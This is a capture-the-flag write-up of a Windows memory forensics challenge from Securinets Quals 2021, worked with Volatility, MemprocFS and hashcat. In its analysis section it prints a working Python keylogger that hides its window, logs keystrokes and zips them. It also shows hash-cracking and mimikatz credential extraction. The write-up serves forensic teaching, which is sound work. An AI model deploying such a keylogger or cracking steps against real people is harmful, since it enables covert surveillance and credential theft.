---
title: KarDi Bee X - Securinets Quals 2021
date: 2021-03-22 15:54:49
author: g4rud4
author_url: https://twitter.com/NihithNihi
categories:
 - Forensics
 - Memory
tags:
 - Securinets Quals
 - Volatility
 - Windows Memory Analysis
---

**tl;dr**

+ File recovery from the memory dump
+ Environment variables analysis.
+ RAR and Zip password cracking.
+ Cracking Windows user password hash.
+ Extracting Keepass Master Password from keystrokes of logged data.

<!--more-->

**Challenge Points**: 988
**No. of solves**: 7
**Solved by**: [g4rud4](https://twitter.com/NihithNihi), [stuxn3t](https://twitter.com/_abhiramkumar), [f4lc0n](https://twitter.com/theevilsyn), [d3liri0us](https://twitter.com/d3liri0us_)

## Description

![description](description.png)

**Challenge File:** You can download the file [here](https://drive.google.com/file/d/1ppAvhaxKijEm1JGtZ_3v_SB3Bz0ZpH1G/view?usp=sharing/).

## Initial Analysis

We are given a **Windows 7** memory dump. Let us see what all processes are running in the system. 

```bash
$ volatility --plugins=volatility-plugins -f memory.raw --profile=Win7SP1x64 pslist
```

![pslist](pslist.png)

We observe `cmd.exe`, `notepad.exe` & `firefox.exe` are running.

## Listing the command prompt history

Let us use the `cmdscan` plugin to check if any suspicious commands were executed.

```bash
$ volatility --plugins=/home/g4rud4/volatility-plugins -f memory.raw --profile=Win7SP1x64 cmdscan
```

![cmdscan](cmdscan.png)

We can see `env` and traverse through Documents and Downloads.

## Listing out environmental variables

Let us use the `envars` plugin to check if any suspicious environmental variables were added.

```bash
$ volatility --plugins=/home/g4rud4/volatility-plugins -f memory.raw --profile=Win7SP1x64 envars
```

![envars](envars.png)

We observe an environmental variable `winrar_pswd` being added.

## Listing out files from Documents and Downloads

Let us use the `filescan` plugin and check the files present in the Documents and Downloads folders.

```bash
$ volatility --plugins=/home/g4rud4/volatility-plugins -f memory.raw --profile=Win7SP1x64 filescan | grep 'Documents\|Downloads'
```

![filescan](filescan.png)

We observe 2 archives and a python script. Let us extract them and check out the contents.

### Extracting files present in filescan

As the offsets of those files are `0x000000007e4ef450`, `0x000000007e57f3e0`, `0x000000007e5c4070`, Let us use the `dumpfiles` plugin to dump the files from memory.

Both the archives are password protected and the python script is a keylogger.

As we already got the password for the RAR file, while analyzing environmental variables. On using it, we got a Keepass KDBX file. Now we need to find the Keepass Master Password.

### Keylogger Script Analysis

As we extracted the keylogger python script, let us analyze it.

```py
import pynput
from zipfile import ZipFile
from pynput.keyboard import Key, Listener

keys = []

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def on_press(key):
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open("C:\Users\Semah\Documents\bm90IG5lZWQgdG8gZGVjb2RlIG1l\aSdtIGp1c3QgYSB0cm9sbA==\ZXh0cmEgZmlsZQ==\bG9ncw==", 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k+' ')

def on_release(key):
    if key == Key.esc:
        zipObj = ZipFile('malmalmal.zip', 'w')
        zipObj.write('C:\Users\Semah\Documents\bm90IG5lZWQgdG8gZGVjb2RlIG1l\aSdtIGp1c3QgYSB0cm9sbA==\ZXh0cmEgZmlsZQ==\bG9ncw==')
        zipObj.close()
        return False


with Listener(on_press = on_press,
              on_release = on_release) as listener:
    listener.join()
```

We observe that all the keystrokes are being stored in the `bG9ncw==` file and then that file is being written to `malmalmal.zip`, and this zip file is password protected.

## Extracting the password of the zip file

The description says the attacker changed the user password and used it to protect a secret file. So let us use the `mimikatz` plugin and extract the user password.

```bash
$ volatility --plugins=/home/g4rud4/volatility-plugins -f memory.raw --profile=Win7SP1x64 mimikatz
```

![mimikatz](mimikatz.png)

We observe a hash of length 32 bytes probably MD5, as his password. But none of the hash-cracking websites are cracking it. So let us see if the attacker had set any password hint. Let us fire-up `MemprocFS` and get the user-password hint registry key value. Generally it is stored at `SAM\Domains\Account\Users\<F_Value>\UserPasswordHint`. Using MemprocFS we can easily traverse registry keys.

![userpasswordhint](userpasswordhint.png)

We observe a hint saying `it's easy to get, all you have to do is crack it, md5 3chars+4numbers+you_rule_here`

### Cracking User password hash

We can use `hashcat` to crack this hash.

```bash
$ hashcat -a 3 -m 0 --force 'a3af05e30feb0ceec23359a2204e2991' '?l?l?l?d?d?d?dyou_rule_here'
```

![hashcat](hashcat.png)
On executing this command we got the result as `sba2021you_rule_here`.

### Retrieving the Keylogger data

As we got the user password, let us use it and extract the contents of the zip file. On using that password we got the keystrokes.

```text
Key.shift H e l l o Key.space s i r , Key.enter Key.shift I Key.space h a v e Key.space c h a n g e d Key.space t h e Key.space p w d Key.space o f Key.space t h e Key.space k p Key.space b e c a s u Key.backspace Key.backspace u s e Key.space i Key.space t h n k Key.space i "" m Key.space u n d e r Key.space a t t a c k , Key.space t h e Key.space n e w Key.space p w d Key.space i s Key.space : Key.space Key.enter <104> Key.shift z n q Key.shift w <99> Key.shift h Key.shift o Key.shift c Key.shift d f Key.shift m <101> Key.backspace <102> Key.shift w i u q à Key.backspace q Key.backspace a Key.shift o Key.shift b Key.enter Key.shift B e s t Key.space r e g a r d s , Key.enter Key.shift S e m a h Key.shift B A Key.esc 
```

Changing it to the human-readable text we got:

```text
Hello sir,
I have changed the pwd of the kp because i thnk i""m under attack, the new pwd is : 
<104>ZnqW<99>HOCDfM<102>WiuqaOB
Best regards,
Semah BA
```

In the above text, he is referring to the KeePass master password. In the description author provided `<97> = 1 <98> = 2 ...` and on changing that in the password we got `8ZnqW3HOCDfM6WiuqaOB`.

## Retrieving Flag.

Now we get the Keepass Master Password, let us see what all passwords are stored in the kdbx file.

![keepass](keepass.png)

We found an entry for Pastebin's password. 

As `firefox.exe` is running, the user might have opened an encrypted Pastebin link. He might have copy-pasted the URL, So Let us use the `clipboard` plugin and check the user's clipboard.

![clipboard](clipboard.png)

As we can see a defuse.ca link(https://defuse.ca/b/wrCi00bPb8eDf9E8b9Iqyx), On opening it and entering the password(`LQlhH481mqpAor4Faroi`) we got from kdbx, we got the flag.

![flag](flag.png)

{% admonition note Flag %}
Securinets{long_way_but_made_it_this_far_gj_!!}
{% endadmonition %}